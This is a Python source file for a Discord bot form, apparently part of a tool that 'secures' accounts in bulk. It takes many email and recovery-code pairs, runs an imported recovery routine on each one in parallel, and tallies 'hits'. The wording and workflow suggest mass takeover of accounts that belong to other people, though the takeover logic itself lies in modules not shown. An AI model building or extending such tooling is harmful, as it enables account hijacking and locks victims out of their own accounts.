from discord import ui
import discord

from securing.recovery_secure import recovery_secure
from ui.modals.bulk_utils import run_bulk_parallel


class BulkRecoveryCodeModal(ui.Modal):
    def __init__(self):
        super().__init__(title="Bulk Recovery Code Securing")
        self.add_item(ui.InputText(
            label="Accounts (one per line)",
            style=discord.InputTextStyle.long,
            placeholder="email1:recovery_code1\nemail2:recovery_code2",
            required=True
        ))

    async def callback(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)

        lines = self.children[0].value.strip().splitlines()
        jobs: list[tuple[str, object]] = []
        failures = 0
        failed_emails: list[str] = []

        for line in lines:
            line = line.strip()
            if not line:
                continue

            parts = line.split(":", 1)
            if len(parts) != 2:
                failures += 1
                failed_emails.append(f"`{line[:30]}...` (invalid format)")
                continue

            email, recovery_code = parts[0].strip(), parts[1].strip()
            jobs.append((
                email,
                lambda e=email, rc=recovery_code, **kwargs: recovery_secure(
                    e, "rcode", {"recovery_code": rc}, **kwargs
                ),
            ))

        count = len(jobs)
        processing_embed = discord.Embed(
            title="Processing Bulk Secure",
            description=(
                f"Processing **{count + failures}** accounts in parallel "
                f"({count} securing, {failures} skipped)..."
            ),
            color=0x2765F5,
        )
        processing_msg = await interaction.followup.send(embed=processing_embed, ephemeral=True)

        hits = 0
        try:
            hits, run_failures, run_failed = await run_bulk_parallel(interaction.user, jobs)
            failures += run_failures
            failed_emails.extend(run_failed)
        finally:
            summary_embed = discord.Embed(
                title="Bulk Secure Complete",
                color=0x2765F5,
            )
            summary_embed.add_field(name="Processed", value=str(hits + failures), inline=True)
            summary_embed.add_field(name="Hits", value=str(hits), inline=True)
            summary_embed.add_field(name="Failed", value=str(failures), inline=True)

            if failed_emails:
                failed_list = "\n".join(failed_emails[:15])
                if len(failed_emails) > 15:
                    failed_list += f"\n...and {len(failed_emails) - 15} more"
                summary_embed.add_field(name="Failed Accounts", value=failed_list, inline=False)

            try:
                await processing_msg.edit(embed=summary_embed)
            except discord.HTTPException:
                await interaction.followup.send(embed=summary_embed, ephemeral=True)
